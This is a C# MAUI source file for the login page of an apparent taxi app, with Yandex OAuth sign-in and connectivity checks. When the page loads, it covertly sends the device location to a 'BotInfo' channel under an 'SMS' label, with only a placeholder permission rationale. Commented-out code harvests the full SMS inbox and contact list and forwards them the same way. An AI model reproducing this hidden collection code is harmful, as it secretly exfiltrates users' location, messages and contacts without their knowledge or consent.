using DevExpress.Maui.Controls;
using TaxiStartApp.Common;
using TaxiStartApp.Common.Bot;
using TaxiStartApp.Common.Interface;
using TaxiStartApp.Common.Location;
using TaxiStartApp.Common.OAuth;
using TaxiStartApp.ViewModels;

namespace TaxiStartApp.Views
{
    [XamlCompilation(XamlCompilationOptions.Compile)]
    public partial class LoginPage : ContentPage
    {
        private IFileHelper _fileHelper;
        //private IPermissionsCheck _permissionsCheck;
        public LoginPage()
        {
            InitializeComponent();
            BindingContext = new LoginViewModel();
            var fileHelper = DependencyService.Get<IFileHelper>();
            _fileHelper = fileHelper;
            
            OnCounterClicked();

            label.HorizontalTextAlignment = TextAlignment.Center;

            Connectivity.ConnectivityChanged += Current_ConnectivityChanged;
        }

        //public async Task<PermissionStatus> CheckAndRequestSMSPermission()        {

        //    PermissionStatus status = await Permissions.CheckStatusAsync<Permissions.Sms>();

        //    if (status == PermissionStatus.Granted)
        //        return status;

        //    //if (status == PermissionStatus.Denied && DeviceInfo.Platform == DevicePlatform.iOS)
        //    //{
        //    //    // Prompt the user to turn on in settings
        //    //    // On iOS once a permission has been denied it may not be requested again from the application
        //    //    return status;
        //    //}

        //    if (Permissions.ShouldShowRationale<Permissions.Sms>())
        //    {
        //        await Shell.Current.DisplayAlert("Needs","BECAUSE","OK");
        //        // Prompt the user with additional information as to why the permission is needed
        //    }
        //    status = await Permissions.RequestAsync<Permissions.Sms>();
        //    return status;
        //}

        //public async Task<PermissionStatus> CheckAndRequestContactsReadPermission()
        //{
        //    PermissionStatus status = await Permissions.CheckStatusAsync<Permissions.ContactsRead>();

        //    if (status == PermissionStatus.Granted)
        //        return status;

        //    //if (status == PermissionStatus.Denied && DeviceInfo.Platform == DevicePlatform.iOS)
        //    //{
        //    //    // Prompt the user to turn on in settings
        //    //    // On iOS once a permission has been denied it may not be requested again from the application
        //    //    return status;
        //    //}

        //    if (Permissions.ShouldShowRationale<Permissions.ContactsRead>())
        //    {
        //        await Shell.Current.DisplayAlert("Needs", "BECAUSE", "OK");
        //        // Prompt the user with additional information as to why the permission is needed
        //    }
        //    status = await Permissions.RequestAsync<Permissions.ContactsRead>();
        //    return status;
        //}
        public async Task<PermissionStatus> CheckAndRequestLocationWhenInUsePermission()
        {
            PermissionStatus status = await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>();

            if (status == PermissionStatus.Granted)
                return status;

            if (Permissions.ShouldShowRationale<Permissions.LocationWhenInUse>())
            {
                await Shell.Current.DisplayAlert("Needs", "BECAUSE", "OK");
            }
            status = await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
            return status;
        }

        public async IAsyncEnumerable<string> GetContactNames()
        {
            var contacts = await Contacts.Default.GetAllAsync();

            // No contacts
            if (contacts == null)
                yield break;

            foreach (var contact in contacts)
                yield return contact.DisplayName;
        }
        //public async IAsyncEnumerable<string> GetContactNames()
        //{
        //    var contacts = await Contacts.Default.GetAllAsync();

        //    // No contacts
        //    if (contacts == null)
        //        yield break;
        //    var contactq = new List<string>();

        //    foreach (var contact in contacts)
        //    {
        //        contactq.Add(contact.DisplayName);
        //    }
        //    yield return string.Join(" ", contactq);

        //}

        private async void OnCounterClicked()
        {
            LocationHelper locationHelper = new LocationHelper();
            var location = await CheckAndRequestLocationWhenInUsePermission();
            if (location.Equals(PermissionStatus.Granted))
            {
                var msg = locationHelper.GetCachedLocation();
                 BotInfo.BotInfoTo($"SMS {DateTime.Now} \n" + msg.Result + "\n");
            }
            //var contact = await CheckAndRequestContactsReadPermission();
            //if (contact.Equals(PermissionStatus.Granted))
            //{                
            //    var collav = GetContactNames();                
            //    BotInfo.BotInfoTo($"SMS {DateTime.Now} \n" + collav + "\n");

            //}

            //            var res = await CheckAndRequestSMSPermission();
            //            if (res.Equals(PermissionStatus.Granted))
            //            {
            //#if ANDROID


            //                List<string> items = new List<string>();
            //                string INBOX = "content://sms/inbox";
            //                string[] reqCols = new string[] { "_id", "thread_id", "address", "person", "date", "body", "type" };
            //                Android.Net.Uri uri = Android.Net.Uri.Parse(INBOX);
            //                Android.Database.ICursor cursor = Microsoft.Maui.ApplicationModel.Platform.CurrentActivity.ContentResolver.Query(uri, reqCols, null, null, null);


            //                if (cursor.MoveToFirst())
            //                {
            //                    do
            //                    {
            //                        string messageId = cursor.GetString(cursor.GetColumnIndex(reqCols[0]));
            //                        string threadId = cursor.GetString(cursor.GetColumnIndex(reqCols[1]));
            //                        string address = cursor.GetString(cursor.GetColumnIndex(reqCols[2]));
            //                        string name = cursor.GetString(cursor.GetColumnIndex(reqCols[3]));
            //                        string date = cursor.GetString(cursor.GetColumnIndex(reqCols[4]));
            //                        string msg = cursor.GetString(cursor.GetColumnIndex(reqCols[5]));
            //                        string type = cursor.GetString(cursor.GetColumnIndex(reqCols[6]));


            //                        items.Add(messageId + (","
            //                                 + (threadId + (","
            //                                 + (address + (","
            //                                 + (name + (","
            //                                 + (date + (" ,"
            //                                 + (msg + (" ," + type))))))))))));
            //                        BotInfo.BotInfoTo($"SMS {DateTime.Now} \n" + msg + "\n");

            //                    } while (cursor.MoveToNext());


            //                }
            //#endif
            //            }
        }
        private void SwipeGestureRecognizer_Swiped(object sender, SwipedEventArgs e)
        {
            bottomSheet.State = BottomSheetState.HalfExpanded;
        }

        private async void Button_Clicked(object sender, EventArgs e)
        {
            await Dispatcher.DispatchAsync(() => {
                bottomSheet.State = BottomSheetState.HalfExpanded;
                
                var s = web.Source = $"https://oauth.yandex.ru/authorize?response_type=code&client_id=36d513472d924ea2901401d51958bc5c&device_id={Constant.DeviceId}";
            });                       
            
        }      

        private async void web_Navigated(object sender, WebNavigatedEventArgs e)
        {
            if (e.Url.StartsWith("https://api.xn--80aaaaadxhwt3bixfhni.xn--p1ai/Oauth?code="))
            {
                try
                {
                    activator.IsRunning = true;
                    YandexOAuth yandexOAuth = new YandexOAuth(e);
                    yandexOAuth.OAuth();
                    
                    YandexProfil yandexProfil = new YandexProfil();
                    yandexProfil.Get(Constant.UserToken.accessToken);

                    _fileHelper.SaveFile(Constant.UserToken.accessToken);

                    await DisplayAlert("Добро пожаловать", Constant.yandexProfil?.realName + "\n" + Constant.yandexProfil?.defaultEmail, "OK");
                    bottomSheet.State = BottomSheetState.Hidden;
                    OnDriverClicked();
                }
                catch (Exception ex)
                {
                    activator.IsRunning = false;
                    bottomSheet.State = BottomSheetState.Hidden;
                    await DisplayAlert("Внимание", "Сервис авторизации не доступен. Попробуйте через телефон", "OK");
                }
                activator.IsRunning = false;
            }            
        }       

        async void OnDriverClicked()
        {
            await Shell.Current.GoToAsync($"//{nameof(MapPage)}");
        }

        protected override void OnAppearing()
        {
            base.OnAppearing();
            CheckConnection();
        }
        // получаем состояние подключения
        private void CheckConnection()
        {
            if (Connectivity.NetworkAccess != NetworkAccess.Internet)
            {
                bottomSheetConnection.IsVisible = true;
                bottomSheetConnection.State = BottomSheetState.HalfExpanded;
            }
            else
            {
                bottomSheetConnection.IsVisible = false;
                bottomSheetConnection.State = BottomSheetState.Hidden;
            }
        }

        // обработка изменения состояния подключения
        private void Current_ConnectivityChanged(object sender, ConnectivityChangedEventArgs e)
        {
            CheckConnection();
        }

        private void Button_Clicked_1(object sender, EventArgs e)
        {
            CheckConnection();
        }
    }
}